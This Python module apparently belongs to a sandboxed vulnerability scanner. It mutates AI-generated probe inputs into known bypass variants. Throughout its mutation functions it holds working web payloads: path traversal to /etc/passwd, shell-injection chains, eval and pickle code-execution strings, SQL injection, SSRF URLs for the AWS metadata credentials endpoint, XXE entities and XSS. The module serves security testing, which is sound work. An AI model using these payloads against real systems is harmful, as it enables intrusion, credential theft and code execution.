"""Phase 1a — deterministic mutation expansion of runtime-probe inputs.

Phase B+ runtime probing in v1.5 generates concrete attack inputs by
asking the model to write them. That works well when the model picks
the right shape on the first try; it misses when the vulnerable code
needs a specific bypass shape the model didn't think of (or whose
training data didn't include the exact CVE pattern).

This module sits between candidate generation and sandbox execution.
For each model-generated input, it deterministically fans out to N
mutated variants drawn from known-bypass families:

  * **Encoding mutations** apply to every string arg regardless of
    attack class — URL-encode, double-URL-encode, UTF-8 overlong, null
    byte injection, CRLF splicing.
  * **Class-specific mutations** layer on top — path-traversal gets
    the `....//`, `..%2f`, `..\\\\` family; command_injection gets
    semicolon / pipe / backtick / subshell chaining; sql_injection
    gets `' OR 1=1--` / UNION / inline-comment variants; etc.

Each mutation is a SINGLE-ARG transformation. If the model emitted
``["../etc/passwd"]``, the mutator yields ``["%2e%2e/etc/passwd"]``,
``["....//etc/passwd"]``, ``["/etc/passwd"]``, etc. — same args list
shape, single arg substituted. This preserves the model's intent
(which arg position is the attack vector) and only varies the payload.

Mutations are bounded by :data:`MAX_MUTATIONS_PER_INPUT` (default 5);
the harness caller picks the best N for the attack class. Each yields
a ``(mutated_args_json, mutation_strategy)`` pair so the journal can
record which variant fired the exploit.

Cost shape:

  Without mutation: MAX_CANDIDATES × MAX_INPUTS_PER_CANDIDATE = 9
                    sandbox runs per file.
  With mutation:    × (1 + MAX_MUTATIONS_PER_INPUT) = 9 × 6 = 54
                    sandbox runs per file worst case.

Inference cost unchanged — mutations are deterministic post-processing.
Sandbox cost scales linearly with attempt count.
"""

from __future__ import annotations

import base64
import json
import urllib.parse

#: Maximum mutations applied per model-generated input. Caps the fan-out
#: so total sandbox runs stay bounded (see module docstring for cost
#: math). Tunable via the orchestrator entry point.
MAX_MUTATIONS_PER_INPUT: int = 5

#: Length-extreme padding size for length-stress mutations.
_PADDING_LEN: int = 8192


def _url_encode(s: str) -> str:
    """Percent-encode every non-alphanumeric character — strictest form,
    catches sanitizers that only check the raw string before decoding."""
    return urllib.parse.quote(s, safe="")


def _double_url_encode(s: str) -> str:
    """Two passes of percent-encoding. Bypasses sanitizers that
    URL-decode once before validating but the consuming sink also
    decodes (net effect: payload reaches the sink as the raw original)."""
    return _url_encode(_url_encode(s))


def _utf8_overlong_dots(s: str) -> str:
    """Replace ``.`` with the UTF-8 overlong-encoded form ``%c0%ae``.
    Some legacy validators reject ``..`` but pass ``%c0%ae%c0%ae``
    which the kernel still decodes to ``..`` during path resolution.
    Historical CVE pattern (Apache, IIS) but still surfaces in
    hand-rolled parsers."""
    return s.replace(".", "%c0%ae")


def _null_byte_suffix(s: str) -> str:
    """Append ``%00.txt`` — bypasses file-extension whitelists by
    convincing the validator the path ends in ``.txt`` while the
    kernel reads up to the null and ignores the suffix."""
    return s + "%00.txt"


def _crlf_inject(s: str) -> str:
    """Splice CRLF mid-string. Catches HTTP-header injection,
    log-poisoning, and command-injection sanitizers that only handle
    semicolons / pipes."""
    if "/" in s:
        head, _, tail = s.partition("/")
        return f"{head}%0d%0a{tail}"
    return s + "%0d%0a"


def _length_pad(s: str) -> str:
    """Pad the input to ``_PADDING_LEN`` chars with the same character
    string. Catches length-based truncation bugs and buffer-handling
    edge cases in argument parsing."""
    if len(s) >= _PADDING_LEN:
        return s
    return s + ("A" * (_PADDING_LEN - len(s)))


# ── Path-traversal-specific mutations ────────────────────────────────────


def _pt_quad_dot(s: str) -> str:
    """The `....//` bypass: against a sanitizer that does a single
    ``startswith('../')`` strip, ``....//foo`` collapses to ``../foo``
    and the traversal goes through. Historical CVE pattern."""
    # If the input already starts with traversal, lift it to quad-dot
    if s.startswith("../"):
        return "..../" + s[3:]
    return "....//" + s.lstrip("/")


def _pt_encoded_slash(s: str) -> str:
    """``..%2f..%2f`` — URL-encoded path separators that don't match
    the literal ``/`` validators look for."""
    return s.replace("/", "%2f")


def _pt_backslash(s: str) -> str:
    """``..\\..\\`` — Windows-style separators in a Linux sanitizer
    sometimes still get consumed by libc path-resolution functions
    (PHP, older Pythons)."""
    return s.replace("/", "\\")


def _pt_encoded_dot(s: str) -> str:
    """``%2e%2e/`` — single URL-encoded dots, simplest bypass against
    string-match sanitizers."""
    return s.replace(".", "%2e")


def _pt_absolute(s: str) -> str:
    """Strip the traversal entirely; try the absolute path directly.
    Catches functions that ALLOW absolute paths but try to block
    ``../`` patterns."""
    # Extract the target after the last `..`
    parts = s.replace("\\", "/").split("/")
    tail = [p for p in parts if p and p not in ("..", ".")]
    return "/" + "/".join(tail) if tail else s


# ── Command-injection-specific mutations ─────────────────────────────────


def _ci_semicolon(s: str) -> str:
    """``; id`` — separator-based chaining. Catches sanitizers that
    only handle quotes."""
    return s + "; id"


def _ci_pipe(s: str) -> str:
    """``| id`` — pipe chaining. Different sanitizer surface than ``;``."""
    return s + " | id"


def _ci_backtick(s: str) -> str:
    """`` `id` `` — backtick command substitution. Older shells +
    eval contexts."""
    return s + " `id`"


def _ci_subshell(s: str) -> str:
    """``$(id)`` — POSIX command substitution. Modern shells, more
    commonly missed by hand-rolled sanitizers."""
    return s + " $(id)"


def _ci_and_chain(s: str) -> str:
    """``&& id`` — conditional chaining. Fires only if the preceding
    command succeeds — useful when the model's input fails."""
    return s + " && id"


def _ci_newline(s: str) -> str:
    """Embed a newline + ``id``. Bypasses ``shell.escape``-style
    sanitizers that handle quotes but not newline injection."""
    return s + "\nid"


# ── Code-injection-specific mutations ────────────────────────────────────


def _code_python_canary(s: str) -> str:
    """Python ``eval`` / ``exec`` canary payload. Side-effect via
    ``os.system('touch /tmp/argus_probe_pwned')`` so Rule 2 (canary
    tmp marker) confirms even when Rule 1 doesn't."""
    return "__import__('os').system('touch /tmp/argus_probe_pwned')"


def _code_python_break_string(s: str) -> str:
    """Break out of a string context and inject Python.
    For inputs like ``"foo"`` getting eval'd: try ``\"; import os;
    os.system('touch /tmp/argus_probe_pwned'); \"``."""
    return "'; __import__('os').system('touch /tmp/argus_probe_pwned'); '"


def _code_js_break_string(s: str) -> str:
    """Break out of a JS string context. Catches ``eval`` /
    ``Function`` constructors with bad string escaping."""
    return "');require('child_process').execSync('touch /tmp/argus_probe_pwned');('"


# ── SQL-injection-specific mutations ─────────────────────────────────────


def _sqli_or_true(s: str) -> str:
    """Classic ``' OR 1=1--`` — login bypass + tautology returns
    all rows. Catches concatenation into WHERE."""
    return s + "' OR 1=1--"


def _sqli_union_version(s: str) -> str:
    """``UNION SELECT 1,version()--`` — surfaces the DB engine
    string into the result set. Matches sql_injection signature
    library entries (version(), @@version, MariaDB, ...)."""
    return s + "' UNION SELECT 1,version()--"


def _sqli_inline_comment(s: str) -> str:
    """``/**/`` between keywords — bypasses whitespace-stripping
    sanitizers. SELECT/**/version() is functionally identical to
    SELECT version() but evades naive sql-keyword regex."""
    return s + "/**/' OR/**/1=1--"


# ── SSRF-specific mutations ──────────────────────────────────────────────


def _ssrf_aws_imds(s: str) -> str:
    """AWS IMDS endpoint — confirms internal-resource reachability
    on EC2 hosts. ssrf signature library has 169.254.169.254 entries."""
    return "http://169.254.169.254/latest/meta-data/iam/security-credentials/"


def _ssrf_localhost(s: str) -> str:
    """``http://localhost:22`` — port-scan-style SSRF detector,
    common SSRF gating gap."""
    return "http://localhost:22/"


def _ssrf_gopher(s: str) -> str:
    """``gopher://`` — legacy protocol many sanitizers forget; passes
    through `urllib`-style parsers and can speak to arbitrary TCP
    services."""
    return "gopher://169.254.169.254:80/_GET%20/%20HTTP/1.0"


def _ssrf_file_proto(s: str) -> str:
    """``file://`` protocol scheme — collapses SSRF + LFI into one
    call when the underlying library honors the protocol."""
    return "file:///etc/passwd"


# ── XXE-specific mutations ───────────────────────────────────────────────


def _xxe_file_entity(s: str) -> str:
    """Classic XXE payload — external entity reads /etc/passwd
    into the parsed XML."""
    return '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'


def _xxe_external_dtd(s: str) -> str:
    """External DTD loader — fetches attacker-controlled DTD that
    can exfiltrate data via parameter-entity tricks."""
    return '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://169.254.169.254/dtd.xml"><foo>x</foo>'


# ── Deserialization-specific mutations ───────────────────────────────────


def _deser_pickle_reduce(s: str) -> str:
    """Pickle bytes that, when loaded, run `os.system('touch ...')`.
    Base64-encoded so it survives JSON-in-JSON transport. Caller is
    responsible for base64-decoding before passing to pickle.loads."""
    pickle_payload = (
        b"\x80\x04\x95(\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix"
        b"\x94\x8c\x06system\x94\x93\x94\x8c\x1ctouch /tmp/argus_probe_pwned"
        b"\x94\x85\x94R\x94."
    )
    return base64.b64encode(pickle_payload).decode("ascii")


# ── XSS-specific mutations ───────────────────────────────────────────────


def _xss_script_tag(s: str) -> str:
    """Classic script-tag XSS — catches HTML-escape sanitizers that
    only filter angle brackets."""
    return s + "<script>alert(1)</script>"


def _xss_event_handler(s: str) -> str:
    """``<img src=x onerror=...>`` — img-tag event handler. Bypasses
    sanitizers that block <script> but allow other tags."""
    return s + '<img src=x onerror="alert(1)">'


def _xss_javascript_proto(s: str) -> str:
    """``javascript:`` URL — catches href-attribute sinks that don't
    validate the protocol scheme."""
    return "javascript:alert(1)"


# ── Mutation registry per attack class ───────────────────────────────────

# Universal mutations apply regardless of attack class. They're cheap
# coverage — encoding variants catch a lot of weak sanitizers.
_UNIVERSAL_MUTATIONS: list[tuple[str, callable]] = [  # type: ignore[type-arg]
    ("url_encode", _url_encode),
    ("double_url_encode", _double_url_encode),
    ("utf8_overlong_dots", _utf8_overlong_dots),
    ("null_byte_suffix", _null_byte_suffix),
    ("crlf_inject", _crlf_inject),
    ("length_pad_8kb", _length_pad),
]

# Class-specific mutations — keyed by attack_class enum value. These
# fire FIRST in the fan-out (more targeted, higher hit-rate); universal
# mutations fill remaining slots.
_CLASS_MUTATIONS: dict[str, list[tuple[str, callable]]] = {  # type: ignore[type-arg]
    "path_traversal": [
        ("quad_dot", _pt_quad_dot),
        ("encoded_slash", _pt_encoded_slash),
        ("backslash", _pt_backslash),
        ("encoded_dot", _pt_encoded_dot),
        ("absolute_path", _pt_absolute),
    ],
    "command_injection": [
        ("semicolon_chain", _ci_semicolon),
        ("pipe_chain", _ci_pipe),
        ("backtick_subst", _ci_backtick),
        ("subshell_subst", _ci_subshell),
        ("and_chain", _ci_and_chain),
        ("newline_inject", _ci_newline),
    ],
    "code_injection": [
        ("python_canary", _code_python_canary),
        ("python_break_string", _code_python_break_string),
        ("js_break_string", _code_js_break_string),
    ],
    "sql_injection": [
        ("or_tautology", _sqli_or_true),
        ("union_version", _sqli_union_version),
        ("inline_comment", _sqli_inline_comment),
    ],
    "ssrf": [
        ("aws_imds", _ssrf_aws_imds),
        ("localhost_port", _ssrf_localhost),
        ("gopher_proto", _ssrf_gopher),
        ("file_proto", _ssrf_file_proto),
    ],
    "xxe": [
        ("file_entity", _xxe_file_entity),
        ("external_dtd", _xxe_external_dtd),
    ],
    "deserialization": [
        ("pickle_reduce_b64", _deser_pickle_reduce),
    ],
    "xss": [
        ("script_tag", _xss_script_tag),
        ("event_handler", _xss_event_handler),
        ("javascript_proto", _xss_javascript_proto),
    ],
}


def _mutate_string(
    *,
    s: str,
    attack_class: str,
    max_mutations: int,
) -> list[tuple[str, str]]:
    """Generate up to ``max_mutations`` (mutated_string, strategy_label)
    pairs for a single string input. Class-specific mutations are
    preferred over universal ones (more targeted hit-rate).

    Class mutations fire FIRST: if ``attack_class`` has class mutations
    in the registry, they fill slots until exhausted or cap reached.
    Universal mutations fill remaining slots.

    Skips mutations that produce the original string verbatim (a no-op
    transformation, e.g., URL-encoding an already-safe alphanumeric
    input). The original input is NOT included here — caller adds it
    separately to preserve the model's choice.
    """
    out: list[tuple[str, str]] = []
    seen: set[str] = {s}  # dedupe against original + against prior mutations

    # Class-specific mutations first
    for label, fn in _CLASS_MUTATIONS.get(attack_class, []):
        if len(out) >= max_mutations:
            break
        try:
            mutated = fn(s)
        except Exception:  # noqa: BLE001 — never fail probe-gen on a mutator bug
            continue
        if not isinstance(mutated, str) or mutated in seen:
            continue
        seen.add(mutated)
        out.append((mutated, label))

    # Universal mutations fill remaining slots
    for label, fn in _UNIVERSAL_MUTATIONS:
        if len(out) >= max_mutations:
            break
        try:
            mutated = fn(s)
        except Exception:  # noqa: BLE001
            continue
        if not isinstance(mutated, str) or mutated in seen:
            continue
        seen.add(mutated)
        out.append((mutated, label))

    return out


def mutate_input(
    *,
    args_json: str,
    attack_class: str,
    max_mutations: int = MAX_MUTATIONS_PER_INPUT,
) -> list[tuple[str, str]]:
    """Fan out a model-generated input into mutated variants.

    ``args_json`` is a JSON-encoded list of args (the runtime probe's
    ``RuntimeProbeInput.args_json``). For each string in the list, we
    generate up to ``max_mutations`` mutations and emit one full args
    list per (string_position, mutation) — single-arg substitution,
    preserving the model's choice of which arg position is the attack
    vector.

    Returns a list of ``(mutated_args_json, strategy_label)`` pairs.
    Empty list if the input has no string args (e.g., all-numeric
    args, or no args). The ORIGINAL ``args_json`` is NOT included —
    caller probes the original separately.

    Decoding failures are silently swallowed (returns empty list).
    Mutator function exceptions are caught individually per-strategy
    so one broken mutator can't crash the whole fan-out.

    Strategy labels follow the format ``<class>:<strategy_name>`` so
    journal records make it obvious which mutation family fired
    (e.g., ``path_traversal:quad_dot``, ``universal:url_encode``).
    """
    if max_mutations <= 0:
        return []
    try:
        args = json.loads(args_json)
    except (json.JSONDecodeError, ValueError):
        return []
    if not isinstance(args, list):
        return []

    out: list[tuple[str, str]] = []
    seen_args_jsons: set[str] = {args_json}

    for pos, arg in enumerate(args):
        if len(out) >= max_mutations:
            break
        if not isinstance(arg, str) or not arg:
            continue
        per_string = _mutate_string(
            s=arg,
            attack_class=attack_class,
            max_mutations=max_mutations - len(out),
        )
        for mutated_str, label in per_string:
            if len(out) >= max_mutations:
                break
            new_args = list(args)
            new_args[pos] = mutated_str
            new_args_json = json.dumps(new_args)
            if new_args_json in seen_args_jsons:
                continue
            seen_args_jsons.add(new_args_json)
            # Strategy label namespaced by source: class vs universal
            is_class_mutation = label in {lab for lab, _ in _CLASS_MUTATIONS.get(attack_class, [])}
            namespace = attack_class if is_class_mutation else "universal"
            out.append((new_args_json, f"{namespace}:{label}"))

    return out


__all__ = [
    "MAX_MUTATIONS_PER_INPUT",
    "mutate_input",
]
